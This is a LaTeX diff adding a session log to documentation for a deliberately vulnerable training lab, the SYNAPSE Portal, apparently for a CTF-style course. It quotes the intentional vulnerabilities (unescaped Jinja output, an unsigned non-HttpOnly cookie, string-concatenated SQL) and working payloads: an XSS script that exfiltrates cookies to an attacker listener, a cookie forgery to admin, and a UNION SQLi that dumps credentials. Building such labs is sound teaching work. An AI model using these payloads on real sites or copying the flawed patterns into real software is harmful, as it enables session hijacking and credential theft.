@@ -51,7 +51,7 @@ as illustrated in Figure~\ref{lab2:fig-topology}.
 
 \begin{figure}[h!]
     \centering
-    \includegraphics[width=0.9\textwidth]{figures/PLACEHOLDER_lab2-topology.png}
+    \fbox{\parbox{0.9\textwidth}{\centering\textit{[Topology diagram --- pending EVE-NG screenshot]}}}
     \caption{Lab 2 network topology: attacker node, perimeter firewall,
              internal router, application server (SYNAPSE Portal), and
              monitoring server.}
@@ -990,3 +990,184 @@ consistently exploited categories in real web application assessments:
           identifier during installation eliminates the need for post-install
           renaming.
 \end{itemize}
+
+% ============================================================
+% SESION 2026-04-24 --- F3 completado: SYNAPSE Portal desplegado
+% ============================================================
+
+\subsection{Implementation Session: 2026-04-24}
+\label{subsec:lab2-session-20260424}
+
+This section records the implementation state verified on 24 April 2026,
+corresponding to the completion of Phase~F3 (Server-A application deployment)
+and the verification of the full lab infrastructure.
+
+% ----------------------------------------
+\subsubsection{Infrastructure State}
+\label{subsubsec:lab2-infra-state}
+
+All five EVE-NG nodes were confirmed running. The host bridge interfaces
+(\texttt{vnet0\_1}, \texttt{vnet0\_2}, \texttt{vnet0\_3}) require explicit
+IP assignment after each EVE-NG host reboot via the helper script
+\texttt{/usr/local/bin/lab2-bridges-up.sh}; this script was executed at
+session start. Table~\ref{tab:lab2-node-state-20260424} summarises the
+observed state of each node.
+
+\begin{table}[H]
+\centering
+\caption{LAB2 node state --- 2026-04-24}
+\label{tab:lab2-node-state-20260424}
+\begin{tabular}{llll}
+\toprule
+\textbf{Node} & \textbf{IP} & \textbf{SSH} & \textbf{Notes} \\
+\midrule
+VyOS-LAB2        & 192.168.30.1 / 10.0.40.1 & Console only & SSH daemon not responding after reboot \\
+Server-A-SYNAPSE & 192.168.30.10             & \checkmark   & Docker active, app running \\
+Server-B-SYNAPSE & 192.168.30.20             & \checkmark   & OS installed, app pending (F4) \\
+Parrot-Attacker  & 10.0.40.x (DHCP)          & --           & Booting from CD; F5 pending \\
+pfSense-LAB2     & WAN: 192.168.0.23 (DHCP)  & --           & UEFI/SeaBIOS mismatch; needs manual start \\
+\bottomrule
+\end{tabular}
+\end{table}
+
+\paragraph{VyOS console access.}
+After the EVE-NG host rebooted, the VyOS SSH daemon was not reachable on
+either of its internal interfaces (192.168.30.1 and 10.0.40.1), despite
+ICMP responding correctly. Console access remained available via the
+serial socket on port~32770 of the EVE-NG host
+(\texttt{telnet localhost 32770}). VyOS routing, DHCP and DNS-forwarding
+configuration persisted correctly across the reboot.
+
+\paragraph{pfSense UEFI note.}
+The pfSense-LAB2 node was installed in UEFI mode (GPT + EFI partition)
+during a previous session. EVE-NG's default launcher uses SeaBIOS
+(\texttt{machine type=pc}), which cannot boot a UEFI installation. A
+dedicated start script at \texttt{/usr/local/bin/pfsense-lab2-start.sh}
+must be used instead; it invokes QEMU with \texttt{machine type=q35} and
+OVMF firmware. This is the expected procedure after any EVE-NG host reboot.
+
+% ----------------------------------------
+\subsubsection{Phase F3: SYNAPSE Intelligence Portal (Server-A)}
+\label{subsubsec:lab2-f3-server-a}
+
+The SYNAPSE Intelligence Portal was deployed on Server-A
+(\texttt{192.168.30.10}) using Docker Compose. The application stack
+consists of three containers:
+
+\begin{itemize}
+    \item \textbf{synapse\_flask\_1} --- Python 3.11 Flask application on
+          port~5000 (internal). Serves all application routes.
+    \item \textbf{synapse\_nginx\_1} --- nginx reverse proxy, published on
+          \texttt{0.0.0.0:80}. Forwards all requests to the Flask backend.
+    \item \textbf{synapse\_victim} --- Playwright headless browser bot.
+          Logs in as \texttt{guest} and visits \texttt{/comments} every 20
+          seconds, simulating a victim user whose session cookie can be
+          stolen via XSS.
+\end{itemize}
+
+The Docker Compose file is located at \texttt{/opt/synapse/docker-compose.yml}
+on Server-A. Application source files reside in \texttt{/opt/synapse/app/}.
+
+\paragraph{Database schema.}
+The SQLite database is initialised by \texttt{init\_db.py} at container
+start. It creates four tables:
+
+\begin{itemize}
+    \item \textbf{users} --- application login credentials (id, username,
+          password MD5, role). Pre-seeded with \texttt{admin} /
+          \texttt{Admin@Synapse2024} and \texttt{guest} / \texttt{guest123}.
+    \item \textbf{reports} --- intelligence reports displayed in the portal
+          (five dummy rows).
+    \item \textbf{comments} --- user-submitted comments, rendered without
+          sanitisation (XSS sink).
+    \item \textbf{admin\_users} --- lateral-movement credential store.
+          Contains \texttt{monitor} / \texttt{M0nit0r2024} and
+          \texttt{FLAG\{synapse\_sqli\_creds\_dumped\}}.
+\end{itemize}
+
+\paragraph{Vulnerability 1 --- Stored XSS (\texttt{/comments}).}
+The \texttt{comments.html} template renders the comment body with
+Jinja2's \texttt{|\,safe} filter, bypassing HTML escaping:
+
+\begin{lstlisting}[language=HTML, caption={XSS sink in comments.html}]
+<div class="body">{{ c.body | safe }}</div>
+\end{lstlisting}
+
+Any HTML or JavaScript submitted as a comment is stored in the database
+and executed verbatim in the browser of every subsequent visitor,
+including the victim bot. Because the session cookie is issued without
+the \texttt{HttpOnly} flag, it is accessible from JavaScript:
+
+\begin{lstlisting}[language=Python, caption={Cookie issued without HttpOnly (app.py)}]
+resp.set_cookie('session',
+    f"{user['id']}:{user['role']}:{user['username']}",
+    httponly=False)
+\end{lstlisting}
+
+A typical XSS payload to exfiltrate the victim cookie to an attacker-controlled
+listener on Parrot (\texttt{python3 -m http.server 8000}) is:
+
+\begin{lstlisting}[language=HTML, caption={XSS payload for cookie exfiltration}]
+<script>
+fetch('http://10.0.40.5:8000/?c='
+      + encodeURIComponent(document.cookie)
+      + '&t=' + Date.now());
+</script>
+\end{lstlisting}
+
+The victim bot visits \texttt{/comments} every 20 seconds, so the cookie
+arrives in the listener log within approximately one polling cycle.
+
+\paragraph{Broken authentication (\texttt{/portal}, \texttt{/search}).}
+The session cookie uses the format \texttt{ID:ROLE:USERNAME} and is not
+cryptographically signed. The server extracts role and username directly
+from the cookie string without any integrity check:
+
+\begin{lstlisting}[language=Python, caption={Unsigned cookie parsing (app.py)}]
+parts = session.split(':')
+role  = parts[1] if len(parts) > 1 else 'guest'
+\end{lstlisting}
+
+Setting \texttt{document.cookie = "session=1:admin:admin; path=/"} in
+the browser console immediately grants admin-level access to all
+restricted routes without knowing the admin password.
+
+\paragraph{Vulnerability 2 --- UNION-based SQL Injection (\texttt{/search}).}
+The search route constructs a SQL query by direct string concatenation:
+
+\begin{lstlisting}[language=Python, caption={SQLi sink in app.py}]
+query = "SELECT * FROM reports WHERE title LIKE '%" + q + "%'"
+results = db.execute(query).fetchall()
+\end{lstlisting}
+
+SQL errors are returned to the browser, confirming the injection point.
+The \texttt{reports} table has five columns. A UNION payload to extract
+credentials from the \texttt{admin\_users} table is:
+
+\begin{lstlisting}[caption={UNION SQLi payload to dump admin\_users}]
+' UNION SELECT 1,username,password,flag,5 FROM admin_users--
+\end{lstlisting}
+
+This returns the \texttt{monitor} SSH credentials (\texttt{M0nit0r2024})
+and the intermediate flag \texttt{FLAG\{synapse\_sqli\_creds\_dumped\}}.
+
+% ----------------------------------------
+\subsubsection{Pending Phases}
+\label{subsubsec:lab2-pending-20260424}
+
+\begin{description}
+    \item[F4 --- Server-B (SYNAPSE Node Monitor.)]
+          Server-B (\texttt{192.168.30.20}) has Ubuntu~24.04 installed
+          with the OS user \texttt{monitor} created. Docker is not yet
+          installed. The Command Injection Flask application must be
+          deployed, and the flag file placed at \texttt{/root/flag\_final.txt}.
+    \item[F5 --- Parrot attacker setup.]
+          The Parrot node requires a static IP on \texttt{Net-Attackers}
+          (\texttt{10.0.40.10/24}) and \texttt{openssh-server} to allow
+          SSH access from the EVE-NG host for tool deployment.
+    \item[F6 --- Full attack walkthrough.]
+          End-to-end verification of the complete chain:
+          XSS $\rightarrow$ cookie hijack $\rightarrow$ SQLi
+          $\rightarrow$ SSH lateral movement $\rightarrow$
+          Command Injection $\rightarrow$ final flag.
+\end{description}
